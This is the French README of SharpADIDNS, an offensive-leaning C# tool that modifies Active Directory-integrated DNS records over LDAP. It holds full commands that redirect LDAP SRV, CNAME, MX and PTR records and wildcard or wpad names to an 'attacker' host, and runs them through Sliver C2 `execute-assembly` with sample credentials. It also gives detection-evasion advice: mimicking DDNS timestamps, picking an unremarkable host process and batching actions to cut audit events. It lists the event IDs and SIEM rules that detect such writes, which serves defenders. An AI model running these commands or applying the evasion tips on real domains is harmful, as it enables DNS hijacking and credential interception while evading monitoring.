# SharpADIDNS

**Langues** : [English](README.md) | [中文](README.zh-CN.md) | **Français**

<img align="right" src="assets/SharpADIDNS-Logo.png" alt="SharpADIDNS Logo" width="280">

<p>
Outil CLI en C# pour lire et modifier les enregistrements DNS intégrés à AD via LDAP, destiné aux travaux d'administration et de recherche autour d'AD-DNS ; un certain nombre d'adaptations d'ingénierie ont été faites pour les scénarios de chargement .NET à distance (par exemple via Sliver <code>execute-assembly</code>).
</p>

<p>
  <img src="https://img.shields.io/badge/platform-Windows-blue" alt="Platform">
  <img src="https://img.shields.io/badge/language-C%23-239120" alt="Language">
  <img src="https://img.shields.io/badge/license-MIT-green" alt="License">
</p>

<p>
Conçu pour des scénarios d'administration réels : mode <code>--c2</code> natif pour le chargement .NET à distance ; <code>--dry-run</code> de pré-vol avec rollback structuré via <code>--backup-to</code> ; scripting batch <code>--script</code> ; reçus JSON avec <code>correlation_id</code> partagé entre invocations ; contrôle fin des attributs d'écriture — <code>--mimic-aging</code> ajuste le champ <code>Timestamp</code> pour rester cohérent avec les enregistrements DDNS environnants, <code>--set-owner</code> permet de fixer explicitement le propriétaire de l'objet, <code>--require-pdc</code> empêche les écritures accidentelles sur un réplica non-PDC.
</p>

<p>
Construit sur <code>System.DirectoryServices</code>, cible .NET Framework 4.x, produit un petit <code>.exe</code> autonome. Réservé à la recherche autorisée, aux environnements de laboratoire et aux travaux d'administration en environnement contrôlé.
</p>

<br clear="right">

<img align="right" src="assets/SharpADIDNS-SS-Alpha.png" alt="SharpADIDNS ScreenShot" width="100%">

<br clear="right">

## Capacités

| Action  | Description |
| ------- | ----------- |
| enum    | Liste tous les `dnsNode` sous une zone, avec un résumé des types et valeurs |
| query   | Lit un nœud et décode en détail chaque blob `dnsRecord`, plus un résumé propriétaire + DACL |
| add     | Crée ou met à jour un enregistrement (A, AAAA, CNAME, TXT, PTR, SRV, MX, ou blob brut) |
| disable | Place le nœud en tombstone (suppression douce ; l'objet reste dans AD) |
| remove  | Suppression dure de l'objet `dnsNode` |
| list-zones | Énumère les objets `dnsZone` à travers les trois partitions (DomainDnsZones / ForestDnsZones / System) |

Les constructeurs d'enregistrements implémentent la structure `DNS_RPC_RECORD` de [MS-DNSP] et l'encodage des labels `DNS_COUNT_NAME` utilisé pour CNAME / PTR / NS.

## Compilation

Requiert .NET Framework 4.x. Depuis un Developer Command Prompt, ou directement avec `csc.exe` :

```
csc /optimize+ /r:System.DirectoryServices.dll /out:SharpADIDNS.exe SharpADIDNS.cs
```

`csc.exe` est livré avec Windows à l'emplacement :

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
```

Aucune dépendance tierce.

**Binaire pré-compilé** : téléchargez `SharpADIDNS.exe` depuis la [page Releases](https://github.com/RedteamNotes/SharpADIDNS/releases/latest) (la CI attache un build frais à chaque release taguée). Pour compiler depuis les sources, suivez la commande `csc` ci-dessus. Le dossier `release/` n'est pas versionné.

**Scénarios de bout en bout** : voir [`docs/RECIPES.fr.md`](docs/RECIPES.fr.md) pour des recettes (reconnaissance DNS, ajout d'enregistrement unique avec rollback, écriture à faible empreinte avec `--mimic-aging` + `--set-owner`, écriture wildcard, ajout SRV, opérations batch, nettoyage de fin de mission, vérification DACL préalable). Le README (ce document) couvre les flags ; les recettes couvrent les *flux*.

### Tests

Les tests unitaires couvrent les fonctions pures (pas besoin d'AD) : helpers d'endian `Bin`, constructeurs + décodeurs `DnsRecord`, cas limites de `DNS_COUNT_NAME`, FILETIME de tombstone, `Json.Escape`. Compilation et exécution :

```
csc /main:TestRunner /r:System.DirectoryServices.dll /out:tests\Tests.exe tests\Tests.cs SharpADIDNS.cs
tests\Tests.exe
```

Code de sortie 0 si succès, 1 sur échec. Le binaire `tests/Tests.exe` est ignoré par git.

## Utilisation

```
SharpADIDNS.exe <action> [options]
```

### Ciblage

| Option | Description |
| ------ | ----------- |
| `--zone <fqdn>`       | Zone DNS, ex. `redteamnotes.local` (requis) |
| `--name <label>`      | Nom de l'enregistrement ; `@` = apex, `*` = wildcard (requis, sauf pour `enum`) |
| `--dn <DN>`    | Contexte de nommage, ex. `DC=redteamnotes,DC=local` (requis) |
| `--partition <name>`  | `DomainDnsZones` (défaut) / `ForestDnsZones` / `System` |
| `--server <host>`     | FQDN ou IP du DC cible. Omettre pour un bind serverless. |

### Données d'enregistrement (`add` uniquement)

| Option | Description |
| ------ | ----------- |
| `--type <T>`        | `A` / `AAAA` / `CNAME` / `TXT` / `PTR` / `SRV` / `MX` (défaut : `A`) |
| `--data <value>`    | IP pour A/AAAA ; FQDN cible pour CNAME/PTR/SRV ; FQDN d'exchange pour MX ; ASCII pour TXT (≤255 octets). Alias : `--ip`. |
| `--srv-priority <N>`| Priorité SRV, 0..65535 (défaut : 0) |
| `--srv-weight <N>`  | Poids SRV, 0..65535 (défaut : 0) |
| `--srv-port <N>`    | Port SRV, 0..65535 (**requis** quand `--type SRV`) |
| `--mx-pref <N>`     | Préférence MX, 0..65535 (défaut : 10) |
| `--raw <base64>`    | Blob `dnsRecord` pré-construit ; contourne `--type` / `--data` et les flags SRV/MX |
| `--ttl <sec>`       | 1..604800 (défaut : 600) |
| `--force`           | Remplace les enregistrements du même type sur un nœud existant. Les enregistrements d'autres types sur le même nœud sont préservés. |
| `--append`          | Garde **tous** les enregistrements existants sur le nœud et en ajoute un de plus. Mutuellement exclusif avec `--force`. Refuse sur les nœuds tombstoned -- utilisez `--force` pour dé-tombstoner et écrire. |

### Authentification

| Option | Description |
| ------ | ----------- |
| `--username <user>`          | UPN ou `DOMAIN\user`. Défaut : token du processus courant. |
| `--password <pwd>`           | Mot de passe en clair. Visible dans les listings de processus, Sysmon EID 1 et l'historique shell ; émet un avertissement sauf si `--allow-cleartext-password` est aussi passé. |
| `--password-stdin`           | Lit le mot de passe depuis stdin (une ligne). |
| `--password-env <VAR>`       | Lit le mot de passe depuis la variable d'environnement nommée. |
| `--password-base64 <b64>`    | Mot de passe UTF-8 encodé en base64. Utile pour transporter des mots de passe contenant `'`, `"`, `$`, des espaces, ou d'autres caractères hostiles au shell à travers plusieurs couches de parsing (ex. Sliver `execute-assembly`). |
| `--allow-cleartext-password` | Silencie l'avertissement de mot de passe en clair de `--password`. |
| `--ldaps`                    | Bind sur LDAPS (port 636). |

Si `--username` est fourni sans aucune source de mot de passe, le mot de passe est demandé interactivement (saisie non échoée). Si stdin est redirigé (CI, scripts via pipe), l'exécution se termine en erreur avec un code usage 1 plutôt que d'attendre silencieusement.

### Sûreté

| Option | Description |
| ------ | ----------- |
| `--dry-run`          | Pour `add` / `disable` / `remove` : se lie à AD (en lecture seule), affiche le DN visé, le nouveau blob, et le delta avec les enregistrements existants. **Aucune écriture** n'est effectuée. Utile pour vérifier avant de valider les changements. |
| `--backup-to <file\|->` | Avant de modifier un nœud (`add --force`, `add --append`, `disable`, `remove`), ajoute une ligne JSON capturant l'état existant. Avec `<file>` : append à ce fichier (s'accumule entre les exécutions). Avec `-` (sentinelle) : écrit sur stdout au lieu du disque -- pas d'artefact disque, utile pour l'exécution en mémoire via Sliver `execute-assembly`. Champs par ligne : `_type:"backup"`, `timestamp` (UTC ISO 8601), `action`, `dn`, `dNSTombstoned`, `records` (tableau de blobs `dnsRecord` base64). En mode `--format json`, le reçu d'action porte déjà `previous_state`, donc `--backup-to -` est supprimé pour éviter la duplication sur stdout. |
| `-y`, `--yes`        | Saute la confirmation interactive sur les opérations à haut risque (voir liste ci-dessous). Requis quand stdin n'est pas un TTY (CI, scripts via pipe) -- sinon les opérations à haut risque refusent de s'exécuter. |
| `--show-pdc`         | Recherche et affiche le hostname du PDC emulator avant d'exécuter l'action. |
| `--require-pdc`      | Erreur sauf si `--server` correspond au hostname du PDC emulator (insensible à la casse ; accepte aussi le premier label DNS). Évite d'écrire sur un réplica non-PDC dont le changement prend plusieurs minutes à se répliquer et apparaît dans `replPropertyMetaData` sous un DSA non-PDC. |

Restauration depuis un fichier de backup : passez via pipe un blob base64 pertinent à `add --raw <base64> --force`. Chaque ligne est indépendante et auto-descriptive.

**Déclencheurs haut risque** qui demandent confirmation (ou requièrent `--yes`) :

- tout `remove` -- supprime l'objet `dnsNode` de façon dure
- `add --name "*"` -- le wildcard couvre la résolution de tous les noms non résolus dans la zone
- `add --name wpad` / `add --name isatap` -- noms surveillés par GQBL, fortement signalés par MDI / SIEM
- `add --force` sur un nœud avec `dNSTombstoned=TRUE` -- le dé-tombstoning est un IOC connu d'anomalie ADIDNS

### Filtres d'énumération (`enum` uniquement)

| Option | Description |
| ------ | ----------- |
| `--filter-type <T,...>` | Liste de types séparés par virgule, ou répété (`--filter-type A --filter-type AAAA` équivaut à `--filter-type A,AAAA`). Affiche les nœuds qui ont **au moins un** enregistrement de ces types. Acceptés : `A`, `AAAA`, `CNAME`, `PTR`, `SRV`, `MX`, `TXT`, `NS`, `SOA`, `TS` (tombstone). |
| `--filter-name <glob>`  | Match le nom du nœud (insensible à la casse). Wildcards `*` et `?`. Exemples : `sql*`, `_*._tcp.*`, `?pad`. |
| `--only-tombstoned`     | N'affiche que les nœuds tombstoned. |
| `--no-tombstoned`       | Cache les nœuds tombstoned (actifs uniquement). |

`--only-tombstoned` et `--no-tombstoned` sont mutuellement exclusifs. Tous les filtres sont appliqués côté client après le fetch LDAP.

### Sortie

| Option | Description |
| ------ | ----------- |
| `-v`, `--verbose`        | Affiche les DN, blobs bruts, détails du bind |
| `-q`, `--quiet`          | Supprime les lignes info `[*]` |
| `--format <text\|json>`  | Format de sortie pour `enum` / `query` / `list-zones` (défaut : `text`). JSON est mono-ligne, adapté au pipe vers `jq`. |
| `--color` / `--no-color` | Force ou désactive les couleurs ANSI (défaut : auto-détection TTY). |
| `-h`, `--help`           | Affiche l'aide complète |
| `-V`, `--version`        | Affiche la version et quitte |

### Fichiers d'arguments

Tout argument commençant par `@` est traité comme le chemin d'un fichier texte dont le contenu est inséré dans le flux d'arguments. Un token par bloc blanc ; les lignes commençant par `#` sont des commentaires. Utile pour sortir les flags de ciblage longs et répétés de chaque commande :

```
# common.args
--zone redteamnotes.local
--dn   DC=redteamnotes,DC=local
--server dc.redteamnotes.local
```

```bash
SharpADIDNS.exe enum @common.args
SharpADIDNS.exe query @common.args --name sccm
```

### Syntaxe des flags

Les deux formes `--flag value` (espace) et `--flag=value` (égal) sont acceptées. La forme égale ne coupe qu'au premier `=`, donc les valeurs contenant `=` (padding base64 `==`, chaînes DN comme `DC=redteamnotes,DC=local`) sont préservées. Pratique quand les arguments passent à travers plusieurs couches de parsing shell (ex. Sliver `execute-assembly`) où la gestion des espaces est fragile.

### Aide par verbe

`SharpADIDNS.exe <verb> --help` (ex. `add --help`, `enum --help`) affiche une ligne USAGE spécifique au verbe et seulement les sections pertinentes (ex. `add` affiche RECORD DATA ; `enum` affiche ENUM FILTERS ; `list-zones` ni l'un ni l'autre). `--help` simple (sans verbe) affiche la référence complète.

### Codes de sortie

| Code | Signification |
| ---- | ------- |
| 0 | Succès |
| 1 | Erreur d'usage / d'argument |
| 2 | Opération LDAP / AD échouée (voir `ExtendedError` sur stderr) |
| 3 | Objet cible introuvable |
| 4 | Accès refusé |

## Exemples

Énumérer tous les nœuds d'une zone :

```bash
SharpADIDNS.exe enum \
    --zone redteamnotes.local \
    --dn DC=redteamnotes,DC=local \
    --server dc.redteamnotes.local
```

Énumérer toutes les zones DNS à travers toutes les partitions (pas besoin de `--zone`) :

```bash
SharpADIDNS.exe list-zones \
    --dn DC=redteamnotes,DC=local \
    --server dc.redteamnotes.local
```

Lire un enregistrement et décoder tous les blobs dessus :

```bash
SharpADIDNS.exe query \
    --zone redteamnotes.local \
    --name sccm \
    --dn DC=redteamnotes,DC=local
```

Écrire un enregistrement A wildcard (s'applique à tous les noms non résolus de la zone) :

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name "*" \
    --type A \
    --data 10.0.0.66 \
    --ttl 600 \
    --dn DC=redteamnotes,DC=local
```

Ajouter un enregistrement AAAA avec identifiants explicites en LDAPS :

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name web \
    --type AAAA \
    --data fe80::1 \
    --dn DC=redteamnotes,DC=local \
    --server dc.redteamnotes.local \
    --username 'redteamnotes\redpen' \
    --password 'RedteamN0t3s.' \
    --ldaps
```

Ajouter un CNAME (préserve tout A/AAAA déjà sur le nœud quand utilisé avec `--force`) :

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name printer \
    --type CNAME \
    --data attacker.redteamnotes.local \
    --dn DC=redteamnotes,DC=local \
    --force
```

Remplacer la cible d'un enregistrement `SRV` LDAP :

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name _ldap._tcp.dc._msdcs \
    --type SRV \
    --srv-priority 0 --srv-weight 100 --srv-port 389 \
    --data attacker.redteamnotes.local \
    --dn DC=redteamnotes,DC=local \
    --force
```

Ajouter un enregistrement `MX` :

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name '@' \
    --type MX \
    --mx-pref 10 \
    --data mail.attacker.redteamnotes.local \
    --dn DC=redteamnotes,DC=local \
    --force
```

Ajouter un enregistrement `PTR` dans une zone reverse :

```bash
SharpADIDNS.exe add \
    --zone 0.0.10.in-addr.arpa \
    --name 66 \
    --type PTR \
    --data attacker.redteamnotes.local \
    --dn DC=redteamnotes,DC=local
```

Tombstoner un nœud plutôt que de le supprimer dur :

```bash
SharpADIDNS.exe disable \
    --zone redteamnotes.local \
    --name wpad \
    --dn DC=redteamnotes,DC=local
```

Écrire un enregistrement pré-construit (ex. pour types non standard ou reproduction de cas en laboratoire) :

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name custom \
    --raw BASE64_DNSRECORD_BLOB \
    --dn DC=redteamnotes,DC=local \
    --force
```

## Notes

- Par défaut, tout utilisateur de domaine authentifié peut créer de nouveaux objets `dnsNode`. Les nœuds existants appartiennent à leur créateur ; les modifier ou les supprimer requiert des ACE explicites (créateur, `DnsAdmins`, ou ACL délégué).
- `wpad` et `isatap` sont bloqués par la Global Query Block List (GQBL) du serveur DNS depuis Server 2008. L'enregistrement sera écrit dans AD mais le serveur DNS refusera de répondre aux requêtes pour ces noms. La GQBL est un réglage de registre côté serveur DNS (`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\GlobalQueryBlockList`) et n'est pas visible via LDAP.
- `disable` est moins bruyant dans les journaux que `remove` : l'objet reste dans AD avec `dNSTombstoned=TRUE` et est nettoyé par AD après le `DsTombstoneInterval` (défaut 14 jours sur Server 2008+). Empreinte d'audit également plus faible (voir ci-dessous).
- Les enregistrements wildcard (`*`) s'appliquent à tout nom non résolu dans la zone. Lancez `enum` d'abord pour confirmer que vous n'écrasez pas de données légitimes.
- `--force` remplace les enregistrements du **même type** sur le nœud cible ; les enregistrements d'autres types sur le même nœud sont conservés. Pour tout effacer, utilisez d'abord `disable` ou `remove`.

## Visibilité d'audit

À quoi ressemblent les écritures sur AD-Integrated DNS via LDAP du point de vue des journaux et des outils de supervision. Utilisez `--dry-run` pour prévisualiser, `--backup-to` pour laisser une piste de rollback, et préférez `disable` (tombstone) à `remove` (suppression dure) quand vous avez le choix.

### Journal d'événements Windows

Ces événements se déclenchent sur le **DC qui reçoit l'écriture**. Ils requièrent l'activation de l'audit Directory Service Access (désactivé par défaut, mais souvent activé dans les environnements avec MDE / MDI / EDR mature).

| Event ID | Source | Déclenché par |
| -------- | ------ | ------------ |
| 5136 | Security | Modification de `dnsRecord` ou `dNSTombstoned` (chemins `add --force` et `disable`) |
| 5137 | Security | Création d'un nouveau `dnsNode` (chemin de création `add`) |
| 5141 | Security | Suppression d'un `dnsNode` (chemin `remove`) |
| 4662 | Security | DS-Access sur le container de zone, conditionné par SACL ; se déclenche avant 5136/5137/5141 |
| 4624 | Security | Logon sur le DC pour les binds `--username`/`--password`. Pas déclenché quand on utilise le token du processus courant. |

L'événement 5137 inclut le RDN du nouveau nœud, donc wildcard / `wpad` / `isatap` ressortent rien que par le nom.

### Microsoft Defender for Identity

MDI dispose d'une famille de détections dédiée aux anomalies ADIDNS. Les capteurs sur chaque DC analysent à la fois le trafic LDAP et le flux 5136/5137/5141. Alertes communément déclenchées par les actions de cet outil :

- **Création suspecte d'enregistrement DNS** -- nouveau `dnsNode` dont le créateur n'est pas dans un groupe service / admin, surtout pour `wpad`, `isatap`, ou wildcard.
- **Modification suspecte d'attribut DNS** -- mutations de blob `dnsRecord` sur des nœuds de haute valeur existants.
- **Reconnaissance via DNS** -- énumération en masse via LDAP (moins spécifique, se déclenche sur un usage intensif d'`enum`).

`--ldaps` **ne contourne pas** MDI -- le capteur lit le trafic déchiffré via les hooks Schannel locaux et consomme directement le journal d'événements.

### Patterns SIEM à anticiper

Les content packs Sentinel / Splunk incluent souvent des règles que cet outil va déclencher :

- `EventID == 5137 AND ObjectClass == dnsNode` (tout nouveau dnsNode).
- `EventID == 5136 AND AttributeLDAPDisplayName IN (dnsRecord, dNSTombstoned)` avec `OperationType == "Value Added"`.
- Sujet du précédent pas dans `Domain Admins` / `DnsAdmins` / `Enterprise Admins`.
- dnsNodes nouvellement créés dont le RDN matche `wpad|isatap|\*|localhost`.

### Caractéristiques anormales dans l'objet lui-même

| Attribut | Pourquoi il sort du lot |
| --------- | ----------------- |
| `dNSTombstoned=TRUE` passant à `FALSE` (dé-tombstone) | Quasiment aucun chemin légitime -- le scavenging AD est le seul chemin commun qui met TRUE. L'outil demande confirmation avant ce cas sauf si `--yes` est donné. |
| Blob `dnsRecord` avec `Timestamp=0` (statique) dans une zone à mise à jour dynamique | Les clients DDNS écrivent toujours `Timestamp != 0` ; les écritures LDAP brutes par défaut à `0`. |
| TTL inhabituel (< 60s ou > 1j sans justification) | Les équipes de supervision profilent les TTL typiques par zone. |
| `whenChanged` sur un nœud qui n'avait précédemment que des changements DDNS | DDNS passe par `secureUpdateAllowed` ; les écritures LDAP brutes mettent à jour `whenChanged` directement. |
| SID propriétaire d'un `dnsNode` qui n'est pas le créateur original ni un groupe privilégié | Visible dans `nTSecurityDescriptor`. L'action `query` exposera cela dans une release future. |

### Réplication

L'attribut `dnsRecord` est répliqué sur tous les DCs dans `DomainDnsZones` (ou `ForestDnsZones` / `System`, selon `--partition`). `replPropertyMetaData` enregistre le DSA d'origine et l'horodatage -- si vous avez écrit sur un DC non-PDC, ce DSA apparaît dans les métadonnées, pas le PDC. La réplication peut prendre plusieurs minutes ; les équipes d'audit corrélant les logs entre DCs remarqueront le décalage si le changement est requêté ailleurs rapidement.

### Réduire le bruit d'audit

Si votre scénario opérationnel cherche à minimiser les déclenchements d'alerte :

- Préférez `disable` (pas d'événement 5141, pas de delete dans `replPropertyMetaData`).
- Préférez le token du processus courant à `--username`/`--password` (pas de pic 4624 logon sur le DC).
- Utilisez `--dry-run` avant chaque écriture -- évitez l'empreinte « test en production ».
- Utilisez `--backup-to` pour qu'un changement détecté puisse être annulé rapidement sans re-bind.
- Choisissez des noms cohérents avec la nomenclature opérationnelle existante de la zone. `wpad` / wildcards / noms très courts attirent l'attention.
- Réglez les TTL en cohérence avec les enregistrements voisins (`enum` d'abord).

## Utilisation via Sliver `execute-assembly`

C'est l'un des principaux chemins de déploiement de l'outil. Sliver charge l'assembly dans un processus hôte via réflexion CLR, exécute `Main` en mémoire, et renvoie stdout/stderr à l'opérateur. Les contraintes d'exécution sont *différentes* d'une invocation shell locale -- certaines hypothèses du mode local ne tiennent plus, et de nouvelles contraintes apparaissent.

### Invocation recommandée

Passez `--c2` et `--password-base64` ; le reste est identique à une invocation locale :

```bash
# côté appelant : encoder le mot de passe une fois
$ printf 'RedteamN0t3s.' | base64
UmVkdGVhbU4wdDNzLg==

# dans la console Sliver :
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username 'redteamnotes\redpen' \
        --password-base64 UmVkdGVhbU4wdDNzLg== \
        --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local \
        --name sccm --type A --data 10.0.0.66
```

`--c2` bascule un ensemble cohérent de valeurs par défaut (pas d'avertissements FUD, pas de prompts, pas de couleur, quiet, `--format json`, `--backup-to -` sur stdout). `--password-base64` est la seule source de mot de passe qui survit proprement au parsing multi-couches de Sliver quand le mot de passe contient `'`, `"`, `$`, ou des espaces.

### Ce que vous récupérez

Une ligne JSON unique sur stdout (le **reçu**) plus une ligne JSON par nœud sauvegardé (uniquement quand `--backup-to <file>` est défini avec un vrai fichier ; le `--backup-to -` par défaut de `--c2` est supprimé puisque le reçu porte déjà `previous_state`).

Schéma du reçu :

```json
{
  "correlation_id": "uuid-shared-by-all-receipts-from-this-invocation",
  "action":         "add" | "disable" | "remove",
  "result":         "ok" | "would_do",   // "would_do" sous --dry-run
  "operation":      "create" | "replace" | "append",   // add uniquement
  "dn":             "DC=sccm,DC=...",
  "zone":           "redteamnotes.local",
  "name":           "sccm",
  "record":         { "type":"A", "type_id":1, "ttl":600, "timestamp":3727482, "ipv4":"10.0.0.66", "blob_base64":"..." },
  "previous_state": null | {
    "tombstoned":     false,
    "records_base64": ["...", "..."]
  },
  "reverse":        "SharpADIDNS.exe remove ..." | null
}
```

- `previous_state` est `null` pour `add` créant un nœud flambant neuf, peuplé sinon.
- `reverse` est un undo une-ligne quand exprimable en une commande unique (uniquement `add` create). Pour replace / append / disable / remove, l'undo est multi-étapes (un `add --raw <b64> --force` par entrée de `previous_state.records_base64`) ; `reverse` vaut `null` et l'appelant itère.
- Sous `--dry-run`, le même schéma est émis mais avec `result: "would_do"` et `set_owner` omis (pas de SetOwner exécuté). Utile pour prévisualiser une écriture sans la valider.
- `correlation_id` est identique à travers chaque ligne JSON produite par une invocation de processus (reçus d'action, reçus dry-run, sortie de `query`/`enum`/`list-zones`, `script_summary`, lignes de backup). Groupez par cela pour l'agrégation de logs en aval.

### Restaurer depuis un reçu

```bash
# depuis previous_state.records_base64 du reçu, restaurer chaque entrée
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    add \
        --c2 \
        --username 'redteamnotes\redpen' \
        --password-base64 UmVkdGVhbU4wdDNzLg== \
        --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local \
        --name sccm \
        --raw <base64-from-previous_state> --force
```

### Choix du processus hôte

Évitez `notepad.exe` -- un `notepad.exe` qui fait des requêtes LDAP vers un DC est une anomalie soft que certaines règles SIEM signalent. Préférez des processus qui font légitimement du trafic LDAP ou sont par ailleurs des citoyens réseau peu remarquables :

- `dllhost.exe` -- générique, commun, fait divers appels RPC/réseau
- `svchost.exe` -- généralement trop restreint sauf si vous lancez votre propre service
- `RuntimeBroker.exe` -- Windows moderne, actif réseau
- `services.exe` -- requiert SYSTEM mais c'est un client LDAP légitime

C'est un bouton côté Sliver (`execute-assembly -p <process.exe>`), pas une feature de SharpADIDNS.

### Ce que `--c2` ne change PAS

- **Les événements d'audit côté DC se déclenchent toujours** (5136 / 5137 / 5141 / 4662). Voir la section `Visibilité d'audit` ci-dessus. `--c2` optimise uniquement l'expérience et l'empreinte côté appelant, sans rapport avec l'audit côté DC.
- **Microsoft Defender for Identity** voit toujours le trafic LDAP sur le capteur. `--ldaps` ne cache pas cela.
- **`--dry-run` toujours recommandé** : lancez une fois avec `--dry-run --c2` pour voir le blob planifié, puis re-lancez sans `--dry-run` pour valider. Même flux d'authentification, zéro écriture AD au passage dry-run.

### Pièges

- **Les sources stdin ne marchent pas** : Sliver `execute-assembly` ne pipe pas stdin à l'assembly. `--password-stdin` et le prompt auto-interactif échouent tous deux avec `Console.IsInputRedirected == true`. Utilisez `--password-base64` à la place.
- **`--password-env <VAR>` marche rarement** : le processus hôte hérite son env du beacon Sliver, pas du shell de l'appelant. Il faudrait d'abord définir la var d'env dans le beacon, ce qui est plus de travail que `--password-base64`.
- **`@argfile.txt`** suppose que le fichier existe sur l'hôte *cible*. Inutile dans le scénario de chargement à distance sauf si vous avez déjà déposé un fichier là-bas (ce qui est un artefact en soi).
- **`--backup-to <file>`** (avec un vrai chemin, pas `-`) écrit le fichier dans le CWD du processus hôte, souvent `C:\Windows\System32`. Le fichier persiste après la sortie du processus. Utilisez `--backup-to -` (ou comptez sur le `previous_state` du reçu).

### Mode batch (`--script`)

Une seule invocation `execute-assembly` exécute plusieurs actions. Les statements sont séparés par `;` ; chaque statement est un verbe d'action régulier avec ses propres flags, appliqué par-dessus les flags externes (qui deviennent les défauts).

```bash
sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
    --c2 \
    --username 'redteamnotes\redpen' \
    --password-base64 UmVkdGVhbU4wdDNzLg== \
    --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local \
    --script "
        enum;
        add --name sccm --type A --data 10.0.0.66 --mimic-aging;
        query --name sccm;
        disable --name old-host
    "
```

Stdout contient une ligne JSON de reçu par statement (dans l'ordre), plus une ligne de résumé final :

```json
{"_type":"script_summary","total":4,"succeeded":4,"failed":0,"on_error":"halt"}
```

**Pourquoi c'est utile pour réduire l'empreinte d'audit** : chaque `execute-assembly` spawn un processus hôte (Sysmon EID 1) et charge le CLR (bavardage ETW .NET). N actions lancées comme N appels `execute-assembly` séparés coûtent N spawns ; les mêmes N actions via `--script` coûtent **un** spawn. Moins de bruit de processus à corréler, moins d'arbres de processus à investiguer.

`--script-on-error halt` (défaut) s'arrête au premier échec. `--script-on-error continue` (ou son alias `--continue-on-error`) continue à tourner et reporte les totaux dans le résumé.

Les flags d'action (`--name`, `--data`, `--raw`, `--force`, `--append`, `--mimic-aging`, `--set-owner`, `--type`, `--srv-*`, `--mx-pref`, `--filter-*`, `--only-tombstoned`, `--no-tombstoned`) sont réinitialisés à chaque statement -- ils ne fuitent pas entre statements. Les flags de ciblage et d'authentification (`--zone`, `--dn`, `--server`, `--username`, `--password*`, `--ldaps`, `--partition`) sont hérités de l'externe et peuvent être surchargés par statement.

## Référence du format d'enregistrement

Chaque valeur `dnsRecord` est un blob `DNS_RPC_RECORD` :

```
offset  size  field
0       2     DataLength       (little-endian)
2       2     Type             (little-endian)
4       1     Version          (= 0x05)
5       1     Rank             (0xF0 = DNS_RANK_ZONE for AD-integrated)
6       2     Flags            (little-endian)
8       4     Serial           (little-endian)
12      4     TTL              (BIG-endian)
16      4     Reserved
20      4     Timestamp        (hours since 1601-01-01; 0 = static)
24      N     Type-specific data
```

Données spécifiques au type :

- A (1) : 4 octets IPv4
- AAAA (28) : 16 octets IPv6
- CNAME (5) / PTR (12) / NS (2) : `DNS_COUNT_NAME`
- TXT (16) : chaîne(s) ASCII préfixée(s) par leur longueur
- TS (0, tombstone) : 8 octets `EntombedTime` FILETIME (little-endian)

`DNS_COUNT_NAME` pour `foo.bar.example` :

```
[0x11][0x03][0x03]foo[0x03]bar[0x07]example[0x00]
  ^     ^
  |     LabelCount (3)
  cchNameLength (17 = données de label incluant le 0x00 final)
```

## Avertissement

Réservé à la recherche autorisée, aux environnements de laboratoire et aux travaux d'administration en environnement contrôlé. L'auteur n'assume aucune responsabilité en cas d'utilisation abusive.
